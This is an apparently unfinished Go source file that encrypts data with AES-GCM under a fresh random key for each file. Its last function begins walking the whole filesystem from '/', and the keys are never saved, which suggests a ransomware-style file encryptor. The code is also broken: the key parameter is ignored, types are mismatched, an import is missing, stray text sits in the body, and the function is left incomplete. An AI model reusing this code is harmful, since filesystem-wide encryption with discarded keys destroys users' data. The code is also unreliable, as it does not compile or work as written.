package symmetric

import (
	"crypto/aes"
	"path/filepath"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
)

/* keyGen function generates random 32 byte 
   key for each file that is encrypted */
func keyGen() *[]byte {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		fmt.Println(err)
	}
	return &key
}

/* Encrypt func encrypts files using our random key and file.
   the result will be an AES cipher block */
func encrypt(data []byte, key []byte) (*[]byte, error) {
	cipherBlock, err := aes.NewCipher(keyGen())
	if err != nil {
		return nil, err
	}
	/* Galois Counter Mode being applied to AES cipher block.
	   GCM also adds authentication to ensure encrypted data 
	   is not tampered with.*/
	gcm, err := cipher.NewGCM(cipherBlock)
	if err != nil {
		return nil, err
	}
	// NONCE/IV initialization.
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Read, nonce); err != nil {
		return nil, err
	}
    // Cipher text with nonce applied
	cipherText := gcm.Seal(nonce, nonce, data, nil)
	return &cipherText, nil

}

func encryptFile(path string, key []byte) (*[]byte, error) {
	fi
       err := filepath.Walk("/", func(path string, info os.FileInfo, err error) error {
		   if err != nil {
			   fmt.Println(err)
		   }
	   }
}
